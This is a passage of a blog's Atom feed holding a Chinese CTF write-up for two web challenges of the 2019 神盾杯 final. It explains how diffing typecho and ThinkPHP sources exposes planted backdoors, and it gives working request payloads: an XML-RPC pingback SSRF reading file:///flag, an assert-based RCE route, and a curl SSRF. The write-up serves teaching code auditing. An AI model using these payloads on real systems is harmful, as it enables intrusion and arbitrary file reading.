src="/images/2019-07-10-21-24-44.png" alt=""><br>然后可以getflag：<br><img src="/images/2019-07-10-21-26-48.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个题还是非常完美的一道题，学到很多，respect！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;2019 WCTF看到有一道web题目开源了：&lt;a href=&quot;https://github.com/paul-axe/ctf.git。&quot; 
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 神盾杯 final Writeup（2）</title>
    <link href="http://skysec.top/2019/07/04/2019-%E7%A5%9E%E7%9B%BE%E6%9D%AF-final-Writeup%EF%BC%882%EF%BC%89/"/>
    <id>http://skysec.top/2019/07/04/2019-神盾杯-final-Writeup（2）/</id>
    <published>2019-07-04T06:00:29.000Z</published>
    <updated>2019-07-09T02:46:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接之前的分析文章，本篇文章将2019 神盾杯线下赛后续两道web题也解析一下。</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="预置后门扫描"><a href="#预置后门扫描" class="headerlink" title="预置后门扫描"></a>预置后门扫描</h3><p>打开源码发现是主流cms typecho，先上工具扫一波：<br><img src="/images/2019-07-04-14-02-34.png" alt=""><br><img src="/images/2019-07-04-14-03-13.png" alt=""><br><img src="/images/2019-07-04-14-04-21.png" alt=""><br>同时注意到版本号：<br><img src="/images/2019-07-04-14-33-44.png" alt=""><br>根据github的开源项目回滚到当前版本：<br><img src="/images/2019-07-04-14-39-31.png" alt=""><br>并进行diff：<br><img src="/images/2019-07-04-14-55-48.png" alt=""></p><h3 id="用户名RCE"><a href="#用户名RCE" class="headerlink" title="用户名RCE"></a>用户名RCE</h3><p><img src="/images/2019-07-04-14-55-33.png" alt=""><br>容易发现/admin/login.php处，$rememberName被反引号包裹，可以进行RCE。</p><h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>/var/Widget/XmlRpc.php：<br><img src="/images/2019-07-04-14-59-56.png" alt=""><br>该漏洞应该为typecho对应版本的原生漏洞，可以搜到相关信息：<br><img src="/images/2019-07-04-15-03-01.png" alt=""><br>那么关键点就在于过滤时，未把file协议过滤掉：<br>/var/Typecho/Http/Client/Adapter.php：<br><img src="/images/2019-07-04-15-00-29.png" alt=""><br>导致我们可以利用其进行SSRF任意文件读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;https://skysec.top/action/xmlrpc&quot; -d &apos;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;file:///flag&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;joychou&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&apos;</span><br></pre></td></tr></table></figure></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><h3 id="预置后门扫描-1"><a href="#预置后门扫描-1" class="headerlink" title="预置后门扫描"></a>预置后门扫描</h3><p>打开源码发现是主流框架 thinkphp，先上工具扫一波：<br><img src="/images/2019-07-04-14-05-59.png" alt=""><br><img src="/images/2019-07-04-14-05-27.png" alt=""><br><img src="/images/2019-07-04-14-05-04.png" alt=""><br>比较遗憾，这里后门因为隐藏非常隐蔽，所以主流静态分析工具并没有很好的识别出webshell。下面还是得靠我们自己diff。<br>该项目是开源项目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gitee.com/liaow/JuBiWang/tree/master</span><br></pre></td></tr></table></figure></p><h3 id="thinkphp缓存机制"><a href="#thinkphp缓存机制" class="headerlink" title="thinkphp缓存机制"></a>thinkphp缓存机制</h3><p><img src="/images/2019-07-04-15-19-29.png" alt=""><br>关于thinkphp的缓存机制，是一个老生常谈的问题，在今年强网杯final中也有相应的问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2019/06/16/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFfinal-Web-Writeup/</span><br></pre></td></tr></table></figure></p><p>这里就不再赘述了。</p><h3 id="全局过滤器后门"><a href="#全局过滤器后门" class="headerlink" title="全局过滤器后门"></a>全局过滤器后门</h3><p>通过diff发现在文件/ThinkPHP/Common/functions.php:<br><img src="/images/2019-07-04-15-22-45.png" alt=""><br>其中出题人自己编写了一个全局函数:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MY_I</span><span class="params">($name,$default=<span class="string">''</span>,$filter=null,$datas=null)</span></span></span><br></pre></td></tr></table></figure></p><p>我们和框架自带的I函数做个比较：<br><img src="/images/2019-07-05-13-36-15.png" alt=""><br>发现出题人使用了自己的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MY_DEFAULT_FILTER</span><br></pre></td></tr></table></figure></p><p>我们跟进一下：<br><img src="/images/2019-07-05-13-37-10.png" alt=""><br>发现内置内门assert，那么我们寻找调用MY_I函数的位置：<br>/Application/Home/Controller/ChartController.class.php：<br><img src="/images/2019-07-04-15-28-52.png" alt=""><br>发现方法getMarketOrdinaryJson()使用了该函数，那么可以构造如下路由进行RCE：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/home/chart/getMarketOrdinaryJson&amp;sky=phpinfo();</span><br></pre></td></tr></table></figure></p><h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>通过diff，发现在文件/Application/Admin/Controller/AdminController.class.php中多了如下方法：<br><img src="/images/2019-07-04-15-26-52.png" alt=""><br>简单看一下发现是curl，那么可以直接进行ssrf文件读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/admin/admin/callOnce&amp;url=file:///flag;</span><br></pre></td></tr></table></figure></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>通过diff，发现在文件/Application/Home/Controller/IndexController.class.php中有如下flag方法：<br><img src="/images/2019-07-04-15-29-49.png" alt=""><br>我们发现只要我们输入的len和flag长度不一致，就会触发debug函数，我们跟进debug函数：<br><img src="/images/2019-07-05-13-53-40.png" alt=""><br>继续跟进log函数：<br><img src="/images/2019-07-05-13-53-51.png" alt=""><br>再跟进fb函数：<br><img src="/images/2019-07-05-13-57-01.png" alt=""><br><img src="/images/2019-07-05-13-56-51.png" alt=""><br>发现最后会进行setHeader，我们的debug信息会在http header中打印出来，那么即可通过这个方式获取flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/home/index/flag&amp;len=1</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>2019 神盾杯线下赛的4道web分析到此结束，总的来说diff还是比较强力的，最后的web4也不错，洞藏的都比较好一些，是和框架相互结合的，而不是生硬嵌入的，希望借此可以提高代码审计能力。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/19038.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;接之前的分析文章，本篇文章将2019 神盾杯线下赛后续两道web题也解析一下。&lt;/p&gt;
&lt;h2 id=&quot;web3&quot;&gt;&lt;a href=&quot;#we
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
</feed>
